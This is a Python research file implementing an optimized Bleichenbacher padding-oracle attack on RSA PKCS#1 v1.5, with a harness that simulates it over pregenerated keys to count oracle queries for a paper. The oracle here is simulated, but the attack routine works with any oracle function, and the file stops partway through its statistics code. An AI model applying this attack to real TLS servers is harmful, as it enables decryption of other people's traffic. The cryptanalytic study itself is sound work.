# Capol-2021 baseline Bleichenbacher implementation.
#
# Vendored verbatim from git tag v0.0_capol, path
#   tester/exploits/robot-tlslite-ng/tlslite/bleichenbacher/capol_bleichenbacher/bleichenbacher.py
# so that the baseline numbers in the paper can be reproduced from the current
# checkout without switching branches. The attack logic itself is UNCHANGED.
#
# Deltas from v0.0_capol (all confined to experiment plumbing, see PATCH markers):
#   1. pandas is imported at module level (it was only imported inside the
#      __main__ block, so bleichenbacher_simulations() failed on import).
#   2. The key CSV is read with header=None. It has no header row, so the
#      default read_csv() silently consumed the first key as column names and
#      left only 999 keys -- ns[i % 1000] then raised IndexError for N >= 1000.
#   3. The key directory is configurable via $CAPOL_KEYS_DIR (was hardcoded
#      "./keys"), so the shared key set under artifact/evaluation/keys can be used.
#   4. The worker count is configurable via $CAPOL_PROCESSES (was hardcoded 50).
#   5. Key CSVs are read with dtype=str. 2048-bit moduli overflow pandas'
#      float64 fallback during dtype inference (OverflowError) on newer
#      pandas; the values are converted with int() right after anyway.
#   6. bleichenbacher_simulations indexes keys directly (ns[i]), not
#      round-robin over the first 1000 (was ns[i % 1000]), so that a run
#      against a larger key set attacks the same moduli, index for index, as
#      the other backends instead of silently repeating keys[0:1000].
#   7. The shared simulation oracle may be told which sequential phase is
#      active, solely so failed runs retain exact phase query counts.
#   8. The selected trimmer LCM is copied to self.lcm for post-run reporting.

import os
import math
import time
import multiprocessing as mp
import logging
import sys
from functools import partial
import numpy as np
import pandas as pd  # PATCH 1

try:
    from utils import AES_Random
except ImportError:
    try:
        from .utils import AES_Random
    except ImportError:
        from tlslite.bleichenbacher.capol_bleichenbacher.utils import AES_Random
# Setup logging
level = logging.INFO
if len(sys.argv) > 1:
    match sys.argv[1]:
        case "DEBUG":
            level = logging.DEBUG
        case "WARN":
            level = logging.WARN

# level = logging.DEBUG
logging.basicConfig(
    level=level,
    format="%(asctime)s [%(levelname)s] %(message)s"
)


def _set_oracle_phase(oracle, phase):
    setter = getattr(oracle, "set_phase", None)
    if setter is not None:
        setter(phase)

class BleichenBacherException(Exception):
    pass

# Random number generator
v_major = 3  # major version number for SSL/TLS session
v_minor = 3  # minor version number for SSL/TLS session

# Bounds on the message
def ceil(a1, b1):  # function for computing ceil(a1 / b1)
    return -(-a1 // b1)


class CapolBleichenAttack():
    def gen_message(self,k):  # generate random message for keylength of k bytes
        logging.debug(f"[gen_message] Entered with k={k}, BVO={self.BVO}")
        # if BVO:
        msize = 48  # where the first two bytes contain the major and minor version number
        message = bytearray([v_major, v_minor])
        message.extend(
            self.aes_random.random_bytes(46)
        )  # extend major and minor version numbers with 46 random bytes
        logging.debug(f"[gen_message] SSL/TLS message generated, msize={msize}")
        return (message, msize)
        # else:
        #     msize = aes_random.randint(
        #         k - 11
        #     )  # message size in bytes, can be at most k-11
        #     logging.debug(f"[gen_message] PKCS message generated, msize={msize}")
        #     return (
        #         aes_random.random_bytes(msize),
        #         msize,
        #     )  # generate and return random message of msize bytes


    def pad_message(self,
        message, msize
    ):  # pad message of msize bytes according to PKCS#1 v1.5 standard
        logging.debug(f"[pad_message] Entered with msize={msize}")
        padsize = self.k - 3 - msize
        padding = self.aes_random.random_nonzero_bytes(padsize)
        EB = b"\x00\x02" + padding + b"\x00" + message
        logging.debug(f"[pad_message] padsize={padsize}, EB[:16]={EB[:16]}... (truncated)")
        return EB
    
    def init_optimized(self,oracle, keylength_):
        """Initialize according to the best experimental result in capols paper"""
        # Select all optimizations
        SH=True
        T=True
        PT=True
        I2C=True
        # Detect best values according to paper

        P_M = float('inf')
        t_slack_ = 0
        bs_slack_ = 0
        match oracle:
            case "TTT":
                T_N=400
            case "TFT":
                T_N=500
            case "FFT":
                match keylength_:
                    case 512:
                        T_N=10000
                        t_slack_ = 10
                        bs_slack_ = 21
                    case 1024:
                        T_N=4000
                        t_slack_ = 4
                        bs_slack_ = 9
                    case 2048:
                        T_N=1025
                        t_slack_ = 1
                        bs_slack_ = 3
            case "BVO":
                P_M = 10000
                match keylength_:
                    case 512:
                        T_N=50000
                        t_slack_ = 450
                        bs_slack_ = 900
                    case 1024:
                        T_N=50000
                        t_slack_ = 600
                        bs_slack_ = 1200
                    case 2048:
                        T_N=80000
                        t_slack_ = 900
                        bs_slack_ = 1800

        logging.debug(f"{(oracle, keylength_, SH,T, PT,I2C, T_N, P_M, t_slack_, bs_slack_)=}")
        # self.init_process(oracle, keylength_, SH,T, PT,I2C, T_N, P_M, t_slack_, bs_slack_)
        return {
            "oracle":oracle,
            "keylength_": keylength_,
            "SH": SH,
            "T":T,
            "PT":PT,
            "I2C":I2C,
            "T_N":T_N,
            "P_M":P_M,
            "t_slack_":t_slack_,
            "bs_slack_":bs_slack_
        }

    def init_process(self,oracle, keylength_, SH, T, PT, I2C, T_N, P_M, t_slack_, bs_slack_):
        # initialize the global variables of the processes for one experiment (these will stay the same for all the simulations of one experiment)
        # initialize keylength, k, B, a and b
        self.keylength = keylength_
        self.k = self.keylength // 8
        self.B = 2 ** (8 * (self.k - 2))
        logging.debug(f"[init_process] {self.B=}")
        self.a = 2 * self.B  # lower bound on message we want to find
        self.b = 3 * self.B - 1  # upper bound on message we want to find
        # initialize oracle, trimmer slack values and expected tries for step 2c (depending on oracle and keylength)
        if oracle == "TTT":
            self.check_eight_nonzero = False
            self.check_one_zero = False
            self.BVO = False
            self.t_slack = t_slack_
            self.bs_slack = bs_slack_
            self.exp_tries = 2
            self.cutoff_2c = 1000
        elif oracle == "TFT":
            self.check_eight_nonzero = True
            self.check_one_zero = False
            self.BVO = False
            self.t_slack = t_slack_
            self.bs_slack = bs_slack_
            self.exp_tries = 2
            self.cutoff_2c = 1000
        elif oracle == "FFT":
            self.check_eight_nonzero = True
            self.check_one_zero = True
            self.BVO = False
            if self.keylength == 512:
                self.t_slack = t_slack_
                self.bs_slack = bs_slack_
                self.exp_tries = 11
                self.cutoff_2c = 5500
            elif self.keylength == 1024:
                self.t_slack = t_slack_
                self.bs_slack = bs_slack_
                self.exp_tries = 5.6
                self.cutoff_2c = 2800
            elif self.keylength == 2048:
                self.t_slack = t_slack_
                self.bs_slack = bs_slack_
                self.exp_tries = 3.34
                self.cutoff_2c = 1670
        elif oracle == "BVO":
            self.check_eight_nonzero = False
            self.check_one_zero = False
            self.BVO = True
            self.t_slack = t_slack_
            self.bs_slack = bs_slack_
            if self.keylength == 512:
                self.exp_tries = 1.05 * pow(2, 9)
                self.cutoff_2c = 1000 * 1.05 * pow(2, 8)
            elif self.keylength == 1024:
                self.exp_tries = 1.37 * pow(2, 9)
                self.cutoff_2c = 1000 * 1.37 * pow(2, 8)
            elif self.keylength == 2048:
                self.exp_tries = 2.28 * pow(2, 9)
                self.cutoff_2c = 1000 * 2.28 * pow(2, 9)
        # initialize improvements and heuristics for this experiment
        self.skipping_holes = SH
        self.trimmers = T
        self.do_parallel_threads = PT
        self.trimmer_values = T_N
        self.pt_max_intervals = P_M
        self.improve_2c = I2C

    def next_s(self,curr_s, s_oracle, step2b, M):
        logging.debug(f"[next_s] Entered with curr_s={curr_s}, step2b={step2b}, intervals={len(M)}")
        calls = 0
        s = curr_s
        if self.skipping_holes:
            if not step2b:  # improved starting value if skipping_holes and in step 2a
                s = ceil(self.n + 2 * self.B, self.b)
                logging.debug(f"[next_s] Skipping holes in step 2a, new s={s}")
            else:
                # we are in step 2b so we know we can increase the starting value
                # compute interval in which we know the message has to lie
                amin = self.b
                bmax = self.a

                for a1, b1 in M:
                    if a1 < amin:
                        amin = a1
                    if b1 > bmax:
                        bmax = b1
                # update bounds using the computed interval
                self.a = amin
                self.b = bmax
                # skip all s values we know cannot work (which are ceil(n, m) - 1 >= ceil(n, b) - 1 many)
                s += ceil(self.n, self.b) - 1
                logging.debug(f"[next_s] Skipping holes in step 2b, new s={s}, a={self.a}, b={self.b}")

        # compute first interval which can be skipped
        j = 1
        low = ceil(3 * self.B + j * self.n, self.a)
        high = ceil(2 * self.B + (j + 1) * self.n, self.b) - 1
        while True:
            # test and increment s until we find a working s value
            if (
                self.skipping_holes and not (j == -1)
            ):  # check whether we can skip current s value (if we have not already skipped all possible intervals we can identify for skipping_holes)
                s, j, low, high = self.check_and_skip_s(s, j, low, high)
                logging.debug(f"[next_s] After check_and_skip_s: s={s}, j={j}, low={low}, high={high}")
            calls += 1
            if calls % 1000 == 0:
                logging.debug(f"[next_s] {calls} calls made, current s={s}")
            if s_oracle(s):
                logging.debug(f"[next_s] Found valid s={s} after {calls} calls")
                return s, calls
            s += 1


    def next_s2(self,a1, b1, curr_s, s_oracle, skip_nr):
        logging.debug(f"[next_s2] Entered with a1={a1}, b1={b1}, curr_s={curr_s}, skip_nr={skip_nr}")
        r = ceil(2 * (b1 * curr_s - 2 * self.B), self.n)
        calls = 0

        while True:
            slow = ceil((2 * self.B + r * self.n), b1)
            shigh = ceil((3 * self.B + r * self.n), a1)
            for s in range(slow, shigh):
                if (
                    self.improve_2c and calls > self.cutoff_2c
                ):  # if we are applying heuristic and calls to find next s is very high we abort as we are in a "very bad" case that cannot be saved
                    logging.warning(f"[next_s2] Exceeded cutoff_2c={self.cutoff_2c}")
                    raise BleichenBacherException(f"2c calls > {self.cutoff_2c=}")
                elif (
                    self.improve_2c and skip_nr > 0
                ):  # skip testing some s values if we are applying heuristic and have identified a skip_nr (and there are still values we should skip)
                    skip_nr -= 1
                else:
                    calls += 1
                    if calls % 1000 == 0:
                        logging.debug(f"[next_s2] {calls} calls made, current s={s}")
                    if s_oracle(s):
                        logging.debug(f"[next_s2] Found valid s={s} after {calls} calls")
                        return s, calls
            r += 1


    def one_step_next_s2(self,a1, b1, r, curr_s, s_oracle, calls):
        logging.debug(f"[one_step_next_s2] Entered with a1={a1}, b1={b1}, r={r}, curr_s={curr_s}, calls={calls}")
        calls += 1
        # compute highest s value for this r
        shigh = ceil((3 * self.B + r * self.n), a1) - 1
        while (
            curr_s > shigh
        ):  # if curr_s is higher than shigh we keep increasing r until we find a curr_s which we can test
            r += 1
            curr_s = ceil((2 * self.B + r * self.n), b1)
            shigh = ceil((3 * self.B + r * self.n), a1) - 1

        if s_oracle(curr_s):
            logging.debug(f"[one_step_next_s2] Found valid s={curr_s} after {calls} calls")
            return (
                True,
                curr_s,
                r,
                calls,
            )  # if curr_s works we return this s value and return True (now, we can update all intervals in the parallel_threads method)
        else:
            # if curr_s does not work we return False, the current r value as well as the next s value to test which is curr_s + 1
            curr_s += 1
            return False, curr_s, r, calls


    def parallel_threads(self,M, s_oracle, s, intervals2b):
        logging.debug(f"[parallel_threads] Entered with {len(M)} intervals")
        calls = 0
        rounds_b = 0  # counts how many s values have to be found to be done with 2b / until we have only one interval left and can continue with step 2c
        state = self.gen_state(M, s)
        while True:  # we continue searching in a round-robin fashion until we find an s value accepted by the oracle / we have only one interval left
            for i in range(len(M)):
                # do one step for the current interval
                success, curr_s, r, calls = self.one_step_next_s2(
                    M[i][0], M[i][1], state[i][0], state[i][1], s_oracle, calls
                )
                if success:
                    # update all intervals if we found an s value (and eliminate empty ones)
                    M = self.update_intervals(M, curr_s)
                    rounds_b += 1
                    logging.debug(f"[parallel_threads] Found s={curr_s}, intervals now {len(M)}")
                    if (
                        len(M) == 1
                    ):  # if we only have one interval left we can continue with step 2c
                        return calls, curr_s, M, rounds_b, intervals2b
                    else:  # if we have more than one interval left after the update we update the states and start with the parallel_threads method for the new intervals
                        intervals2b.append(len(M))
                        state = self.gen_state(M, curr_s)
                    break
                else:  # update only the state of this interval if we have not found a working s value
                    state[i] = (r, curr_s)


    def gen_state(self,M, s):
        logging.debug(f"[gen_state] Entered with {len(M)} intervals")
        state = []
        for i in range(len(M)):
            (a1, b1) = M[i]
            r = ceil(2 * (b1 * s - 2 * self.B), self.n)
            slow = ceil((2 * self.B + r * self.n), b1)
            state.append((r, slow))
        return state


    def oracle(self,s, m):
        logging.debug(f"[oracle] Called with s={s}, m={m}")
        r = (m * s) % self.n
        in_interval = (2 * self.B <= r) and (
            r < 3 * self.B
        )  # checks whether first byte is 0x00 and second byte is 0x02
        if not in_interval:  # return False if first test fails (made by all oracles), make it faster for simulation (in practice not a good idea to immediately return False if this test fails)
            return False
        EB = int.to_bytes(
            r, self.k, "big"
        )  # transform r into a bytes object, note: indexing in python starts with 0 but we start counting bytes for EB with index 1
        if (
            self.check_eight_nonzero
        ):  # oracle checks that EB1=0x00, EB2=0x02 and EB3-EB10 are nonzero
            eight_nonzero = all((x != 0) for x in EB[2:10])
            if not eight_nonzero:  # if does not pass the check we return False
                return False

            if (
                self.check_one_zero
            ):  # oracle also checks that at least one byte from EB11 to EBk is 0x00
                one_zero = any((x == 0) for x in EB[10:])
                return one_zero

            return True

        elif self.BVO:  # BadVersionOracle for SSL/TLS sessions
            # in addition to testing that EB1=0x00 and EB2=0x02 also tests that EB3 to EB(k-49) are nonzero, EB(k-48)=0, EB(k-47)=major and EB(k-46)=minor
            # first check zero byte and if not zero directly return False (to make simulations faster)
            zero = EB[self.k - 49] == 0
            if not zero:
                return False
            # next check that there is some wrong version number and if not directly return False (again, to make simulations faster)
            wrong_vnumbers = EB[self.k - 48] != v_major or EB[self.k - 47] != v_minor
            if not wrong_vnumbers:
                return False

            # lastly, check that EB3 to EB(k-49) are nonzero
            nonzeros = all((x != 0) for x in EB[2 : (self.k - 49)])
            return nonzeros
        return in_interval  # oracle that only checks that EB1=00 and EB2=02


    def check_overlaps(self,newM, low, high):
        logging.debug(f"[check_overlaps] Called with low={low}, high={high}")
        for i in range(len(newM)):
            (a1, b1) = newM[i]
            if (a1 <= high) and (b1 >= low):
                newa = min(a1, low)
                newb = max(b1, high)
                newM[i] = (newa, newb)
                logging.debug(f"[check_overlaps] Merged intervals to ({newa}, {newb})")
                return newM
        newM.append((low, high))
        logging.debug(f"[check_overlaps] Added interval ({low}, {high})")
        return newM


    def update_intervals(self,M, s):
        logging.debug(f"[update_intervals] Called with s={s}")
        newM = []
        for a1, b1 in M:
            rlow = ceil((a1 * s - 3 * self.B + 1), self.n)
            rhigh = (b1 * s - 2 * self.B) // self.n + 1
            for r in range(rlow, rhigh):
                interval_low = max(a1, ceil((2 * self.B + r * self.n), s))
                interval_high = min(b1, (3 * self.B - 1 + r * self.n) // s)

                newM = self.check_overlaps(newM, interval_low, interval_high)
        logging.debug(f"[update_intervals] Updated to {len(newM)} intervals")
        return newM


    def gen_and_test_trimmers(self,s_oracle):
        logging.debug("[gen_and_test_trimmers] Entered")
        trims_den = []
        maxt = ceil(2 * self.n, 9 * self.B)
        count = 0
        slack = self.t_slack + 1
        for t in range(3, maxt):
            t_inv = pow(t, -1, self.n)
            umin = (2 * t) // 3 + 1
            umax = ceil(3 * t, 2) - 1
            for s in range(1, slack + 1):
                if t - s < umin and t + s > umax:
                    break
                if count >= self.trimmer_values:
                    logging.debug(f"[gen_and_test_trimmers] Reached trimmer_values={self.trimmer_values}")
                    return trims_den, count
                if t - s >= umin and math.gcd(t - s, t) == 1:
                    count += 1
                    if s_oracle(((t - s) * t_inv) % self.n):
                        trims_den.append(t)
                        logging.debug(f"[gen_and_test_trimmers] Found denominator t={t}")
                        break
                if count >= self.trimmer_values:
                    return trims_den, count
                if t + s <= umax and math.gcd(t + s, t) == 1:
                    count += 1
                    if s_oracle(((t + s) * t_inv) % self.n):
                        trims_den.append(t)
                        logging.debug(f"[gen_and_test_trimmers] Found denominator t={t}")
                        break
        logging.info(f"[gen_and_test_trimmers] Found {trims_den=} after {count=}")
        return trims_den, count


    def find_low_high(self,t, s_oracle):
        logging.debug(f"[find_low_high] Entered with t={t}")
        calls = 0
        t_inv = pow(t, -1, self.n)
        low = (
            (2 * t) // 3 + 1
        )  # lowest possible u value we have to test for finding ul (a lower value cannot work)
        high = (
            ceil(3 * t, 2) - 1
        )  # highest possible u value we have to test for finding uh (a higher value cannot work)
        # find ul by performing binary search in [low, t], want ul as small as possible
        # want u/t >= 1 to trim interval, so upper bound on ul is t
        u_l, calls = self.bin_search_trimmers(low, t, t_inv, s_oracle, True, calls)
        # find uh by performing binary search in [t, high], want uh as large as possible
        # want u/t <= 1 to trim interval, so lower bound is t
        u_h, calls = self.bin_search_trimmers(t, high, t_inv, s_oracle, False, calls)
        logging.debug(f"[find_low_high] Found ul={u_l}, uh={u_h}, t={t}")
        return (u_l, t), (u_h, t), calls


    def bin_search_trimmers(self,low, high, t_inv, s_oracle, findmin, calls):
        logging.debug(f"[bin_search_trimmers] Entered with low={low}, high={high}, findmin={findmin}")
        if low >= high:
            if findmin:  # we know that our high bound always works if we want to find the minimum ul
                return high, calls
            else:  # we know that our low bound always works if we want to find the maximum uh
                return low, calls
        else:
            # if there are at least two values left we look at middle value mid and test whether the trimmer pair (mid, t) works
            if findmin:
                mid = (low + high) // 2
            else:
                mid = ceil(low + high, 2)

        calls += 1
        if s_oracle((mid * t_inv) % self.n):
            # if trimmer pair (mid, t) works we can update the bounds, for ul we can update the high bound (as we want to find the minimum) and for uh the lower bound (as we want to maximize uh)
            if findmin:
                return self.bin_search_trimmers(low, mid, t_inv, s_oracle, findmin, calls)
            else:
                return self.bin_search_trimmers(mid, high, t_inv, s_oracle, findmin, calls)
        else:
            # if the trimmer pair (mid, t) does not work we could have a false negative (depending on the oracle type) and we do not want to proceed with the wrong interval (and hence throw away a good trimmer)
            # for ul we want to find the smallest working u value, hence if mid does not work (to make the false negative probability smaller) we try values mid-1, ..., mid-bs_slack
            # for uh we want to find the largest working u value, hence if mid does not work (to make the false negative probability smaller) we try values mid+1, ..., mid+bs_slack
            # bs_slack is set differently for the different oracle types and keylengths to obtain the best performance (in terms of required oracle calls)
            if findmin:
                # if mid does not work we look at values mid-1, mid-2, ... mid-bs_slack
                for s in range(1, self.bs_slack + 1):
                    if mid - s >= low:
                        # if the u value is above the lower bound we test it
                        calls += 1
                        if s_oracle( ((mid - s) * t_inv) % self.n):  # as soon as we have found a working value we return the updated interval and continue searching there
                            return self.bin_search_trimmers(
                                low, mid - s, t_inv, s_oracle, findmin, calls
                            )
                    else:
                        # if we have tested all values until the lower bound we know that all of them do not work and proceed to search in the upper interval
                        return self.bin_search_trimmers(
                            mid + 1, high, t_inv, s_oracle, findmin, calls
                        )
                # if we have not found a working trimmer looking in upper interval
                return self.bin_search_trimmers(mid + 1, high, t_inv, s_oracle, findmin, calls)
            else:
                # if mid does not work we look at values mid+1, mid+2, ... mid+bs_slack
                for s in range(1, self.bs_slack + 1):
                    if mid + s <= high:
                        # if the u value is below the upper bound we test it
                        calls += 1
                        if s_oracle(((mid + s) * t_inv) % self.n):
                            # we have found a working u value, so update the interval and continue searching there
                            return self.bin_search_trimmers(
                                mid + s, high, t_inv, s_oracle, findmin, calls
                            )
                    else:
                        # if we have tested all values below the upper bound we proceed to search in the lower interval
                        return self.bin_search_trimmers(
                            low, mid - 1, t_inv, s_oracle, findmin, calls
                        )
                # if none of the tested u values worked we continue searching in the lower interval
                return self.bin_search_trimmers(low, mid - 1, t_inv, s_oracle, findmin, calls)


    def check_and_skip_s(self,s, j, low, high):
        logging.debug(f"[check_and_skip_s] Entered with s={s}, j={j}, low={low}, high={high}")
        while True:
            if s >= low and s <= high:
                s = high + 1
            elif low > high:
                logging.debug(f"[check_and_skip_s] No more intervals to skip, j={j}")
                return s, -1, 0, 0
            elif s < low:
                return s, j, low, high
            j += 1
            low = ceil(3 * self.B + j * self.n, self.a)
            high = ceil(2 * self.B + (j + 1) * self.n, self.b) - 1


    def bleichenbacher_p(self,i, rn_key, n, verbose=False):
        
        logging.debug(f"[bleichenbacher_p] Entered for i={i}")
        # GENERATE MESSAGE
        # initialize random number generator for this simulation of the experiment
        self.aes_random = AES_Random(rn_key)
        # extract keys from input rsa_keys
        # self.n, self.e, _ = int(rsa_keys[0]), int(rsa_keys[1]), int(rsa_keys[2])
        # generate a message for a keylength of k bytes, message is a bytes object with msize bytes
        (message, msize) = self.gen_message(self.k)
        # pad the message according to the PKCS#1 v1.5 standard
        EB = self.pad_message(message, msize)
        # convert the message to an integer for processing in the decryption algorithm
        message = int.from_bytes(EB, "big")
        # s_oracle(s) = s_oracle(s)
        # Workaround for the following problem
        #   In real scenarios I want a s_oracle function without knowing m
        #   In simulations I need m for the speedup
        s_oracle = partial(self.oracle, m=message)
        logging.info(f"[bleichenbacher_p] [{i}] start_attack")
        out = self.attack(s_oracle, n)
        assert out[0] == message
        result = (i,)  + out[1:]

        logging.info(f"[bleichenbacher_p] [{i}] finished")
        return result
    
    def attack(self, s_oracle, n):
        # try:
            logging.debug("[attac] Message generated and padded")
            self.n = n
            # ciphertext = pow(message, e, n) # encryption not necessary as we will take a shortcut in the oracle to improve performance
            # initialize oracle calls for the different parts (calls needed for step 2a, 2b and 2c)
            oracle_calls_a = 0
            oracle_calls_b = 0
            oracle_calls_c = 0
            # initialize how many rounds of 2b were needed, how many intervals there were before a round of 2b (if a round of 2b had to be made)
            rounds_b = 0
            intervals2b = []
            # initialize number of oracle calls required for finding and determining the best trimmers
            oracle_calls_t = 0
            self.lcm = 1
            # START ATTACK
            self.a = 2 * self.B  # lower bound on the message (that the attacker knows)
            self.b = 3 * self.B - 1  # upper bound on the message (that the attacker knows)
            low = (
                1,
                1,
            )  # initialize trimmer pair to trim lower bound (u, t), want to maximize t/u
            high = (
                1,
                1,
            )  # initialize trimmer pair to trim upper bound (u, t), want to minimize t/u
            # perform trimmer improvement
            if self.trimmers:
                logging.debug("[attack] Generating trimmers...")
                _set_oracle_phase(s_oracle, "trimmer")
                trims_den, calls = self.gen_and_test_trimmers(s_oracle)
                oracle_calls_t += calls
                if len(trims_den) != 0:
                    lcm = int(np.lcm.reduce(trims_den))
                    self.lcm = lcm
                    low, high, calls = self.find_low_high(lcm, s_oracle)
                    oracle_calls_t += calls
                    self.a = (2 * self.B * low[1]) // low[0]
                    self.b = (3 * self.B - 1) * high[1] // high[0] + 1
                    logging.debug(f"[attack] Trimmers successful: {lcm=}, Leftover interval {(self.b-self.a)/self.B}/B")
                else:
                    logging.debug("[attack] Trimming unsuccessful")
            M = [(self.a, self.b)]
            trim_value = (self.B - 1) / (self.b - self.a + 1)
            logging.debug("[attack] Starting Step 2.a")
            _set_oracle_phase(s_oracle, "search")
            s, calls = self.next_s(ceil(self.n, (3 * self.B)), s_oracle, False, M)
            oracle_calls_a += calls
            M = self.update_intervals(M, s)
            logging.debug(f"[attack] Step 2.a complete. s={s}, oracle_calls_a={oracle_calls_a}, intervals={len(M)}")
            skip_nr = 0  # initialize how many values in step 2c we will skip (which we would otherwise test with the oracle)
            calls_2c_1 = 0
            count_2c = False
            step_counter = 0
            while True:
                step_counter += 1
                # Step 2.b
                if len(M) > 1:
                    _set_oracle_phase(s_oracle, "other")
                    intervals2b.append(len(M))
                    logging.debug(f"[attack] Step 2.b round {step_counter}, intervals={len(M)}")
                    if self.do_parallel_threads and len(M) <= self.pt_max_intervals:
                        oracle_calls_b, s, M, rounds_b, intervals2b = self.parallel_threads(
                            M, s_oracle, s, intervals2b
                        )
                        logging.debug(f"[attack] Parallel threads used in Step 2.b, intervals now {len(M)}")
                        continue
                    rounds_b += 1
                    s, calls = self.next_s(s + 1, s_oracle, True, M)
                    oracle_calls_b += calls
                    logging.debug(f"[attack] Step 2.b round {step_counter} complete. s={s}, oracle_calls_b={oracle_calls_b}, intervals={len(M)}")
                # Step 2.c
                elif len(M) == 1:
                    _set_oracle_phase(s_oracle, "bottom_up")
                    (a1, b1) = M[0]
                    if a1 == b1:
                        logging.info("Solution found")
                        logging.info(f"\t{oracle_calls_a=}")
                        logging.info(f"\t{oracle_calls_b=}")
                        logging.info(f"\t{oracle_calls_c=}")
                        logging.info(f"\t{oracle_calls_t=}")
                        logging.info(f"\t{rounds_b=}")
                        logging.info(f"\t{trim_value=}")
                        logging.info(f"\t{intervals2b=}")
                        logging.info(f"\t{low=}")
                        logging.info(f"\t{high=}")

                        # assert a1 == message
                        return (
                            a1,
                            oracle_calls_a,
                            oracle_calls_b,
                            oracle_calls_c,
                            oracle_calls_t,
                            rounds_b,
                            trim_value,
                            intervals2b,
                            low,
                            high,
                        )
                    logging.debug(f"[attack] Step 2.c round {step_counter}, interval=({a1}, {b1})")
                    s, calls = self.next_s2(a1, b1, s, s_oracle, skip_nr)
                    oracle_calls_c += calls
                    logging.debug(f"[attack] Step 2.c round {step_counter} complete. s={s}, oracle_calls_c={oracle_calls_c}")
                    if self.improve_2c:
                        if calls > 5 * self.exp_tries and not count_2c:
                            count_2c = True
                        elif count_2c and calls_2c_1 == 0:
                            calls_2c_1 = calls
                        elif count_2c and calls_2c_1 != 0:
                            skip_nr += min(calls_2c_1, calls) - self.exp_tries
                            skip_nr = max(0, skip_nr)
                            count_2c = False
                            calls_2c_1 = 0
                # Step 3
                M = self.update_intervals(M, s)
                if step_counter % 100 == 0:
                    logging.debug(f"[attack] Progress: {step_counter} step2c iterations, current intervals: {len(M)}")
        # except Exception as e:
        #     logging.error(f"[attack] Exception: {e}")


def collect_result(result):
    # functions called whenever one simulation of the experiment is done, saves all the results for one simulation in the correct arrays
    # this function is called sequentially for each finished simulation, so we have the same order of the results in the different arrays
    # try and catch block for the heuristic as we will not append any results whenever we abort
    # extract the result from a simulation
    logging.debug(f'[collect_result] {result=}')

    global \
        hist, \
        hista, \
        histb, \
        histc, \
        hist_roundsb, \
        hist_intervals2b, \
        hist_utmin, \
        hist_utmax, \
        histt, \
        histtrim_value, \
        index
    (
        i,
        oracle_calls_a,
        oracle_calls_b,
        oracle_calls_c,
        oracle_calls_t,
        rounds_b,
        trim_value,
        intervals2b,
        utmin,
        utmax,
    ) = result

    # compute total number of oracle calls required for the simulation
    oracle_calls = oracle_calls_a + oracle_calls_b + oracle_calls_c + oracle_calls_t
    # append results to the arrays
    hist.append(oracle_calls)
    hista.append(oracle_calls_a)
    histb.append(oracle_calls_b)
    hist_roundsb.append(rounds_b)
    histc.append(oracle_calls_c)
    histt.append(oracle_calls_t)
    histtrim_value.append(trim_value)
    hist_intervals2b.append(intervals2b)
    hist_utmin.append(utmin)
    hist_utmax.append(utmax)
    index.append(i)





def bleichenbacher_simulations(
    R, E, oracle, keylength_, N, path, SH, T, PT, I2C, T_N, P_M, t_slack_, bs_slack_
):
    # R = Experiment Round, E = Experiment Number, keylength, N = number of simulations, path = where to save the generated data

    # SH = skipping Holes, T = Trimmers, PT = Parallel Threads, I2C = Improve Step 2c, TN = number of trimmers, PM = maximum number of intervals to start PT method
    # t_slack = slack value used for generating and testing trimmers, bs_slack = slack value used for binary search for trimmers
    # PATCH 4: worker count configurable (upstream hardcoded 50)
    processes = int(os.environ.get("CAPOL_PROCESSES", "50"))
    # initialize all the histograms to be empty when starting an experiment
    global \
        hist, \
        hista, \
        histb, \
        histc, \
        hist_roundsb, \
        hist_intervals2b, \
        hist_utmin, \
        hist_utmax, \
        histt, \
        histtrim_value, \
        index
    hist = []
    hista = []
    histb = []
    histc = []
    hist_roundsb = []
    hist_intervals2b = []
    hist_utmin = []
    hist_utmax = []
    histt = []
    histtrim_value = []
    index = []
    # read keys from generated key file
    # PATCH 3: key directory configurable (upstream hardcoded "./keys")
    keys_path = os.path.join(os.environ.get("CAPOL_KEYS_DIR", "./keys"), "rsa-%d.csv" % keylength_)
    # read in the pregenerated keys with the correct keylength
    # we use a file of 1000 pregenerated keys and will use them in a round-robin fashion for the simulations
    # PATCH 2: header=None -- the CSV has no header row
    # PATCH 5: dtype=str -- avoid float64 overflow on 2048-bit moduli
    keys = pd.read_csv(keys_path, header=None, dtype=str)
    keys = keys.drop(keys.columns[0], axis=1).to_numpy()
    ns = [int(x[0]) for x in keys]
    
    """
    # step through one experiment (to inspect it)
    i = 20119
    # rnkey = ('R').to_bytes(4, 'big') + ('E').to_bytes(4, 'big') + ('i').to_bytes(4, 'big') + ('0').to_bytes(4, 'big')
    rnkey = b'supersecretkey11'
    init_process(oracle, keylength, SH, T, PT, A2b, A1S2b, A1R2b, I2C, TN, PM, t_slack, bs_slack)
    result = bleichenbacher_p(i, rnkey, keys[i % 1000])
    """
    # parallelize using a pool of processes, initialize the global variables of the processes with the desired parameters (oracle type, keylength, etc.)
    attack = CapolBleichenAttack()

    attack.init_process(oracle, keylength_, SH, T, PT, I2C, T_N, P_M, t_slack_, bs_slack_)
    pool = mp.Pool(processes=processes)

    # print start time of experiment
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    print("Starting Experiment %d: %s" % (E, current_time))
    # run N simulations of the experiment asynchronously on the specified number of processes and save the results for each run in the histograms
    for i in range(N):
        # specify the key for the random number generator for this simulation of the experiment, this key is unique for each simulation and experiment such that we always generate different random values and messages
        rn_key = (
            (R).to_bytes(4, "big")
            + (E).to_bytes(4, "big")
            + (i).to_bytes(4, "big")
            + (0).to_bytes(4, "big")
        )
        # apply the bleichenbacher function using this random number generator key and rsa key
        # breakpoint()
        # PATCH 6: direct index, not round-robin over the first 1000 -- when
        # CAPOL_KEYS_DIR points at a larger key set (e.g. the 100k set used
        # for the final grid), this makes the baseline attack the same moduli
        # as the other backends instead of silently reusing keys[0:1000].
        pool.apply_async(
            attack.bleichenbacher_p, args=[i, rn_key, ns[i]], callback=collect_result
        )
    # close the processor pool and wait for all of them to finish
    pool.close()
    pool.join()
    # now all of the data is in the respective histograms
    # calculate metadata to store in metadata file
    success_prob = len(hist) / N
    mean = np.average(hist)
    median = np.median(hist)
    mean_2a = np.average(hista)
    median_2a = np.median(hista)
    mean_2b = np.average(histb)
    median_2b = np.median(histb)
    mean_2c = np.average(histc)
    median_2c = np.median(histc)
    mean_rb = np.average(hist_roundsb)
    median_rb = np.median(hist_roundsb)
    mean_t = np.average(histt)
    median_t = np.median(histt)
    mean_trimf = np.average(histtrim_value)
    median_trimf = np.median(histtrim_value)
    # create array containing metadata and labels for the respective metadata
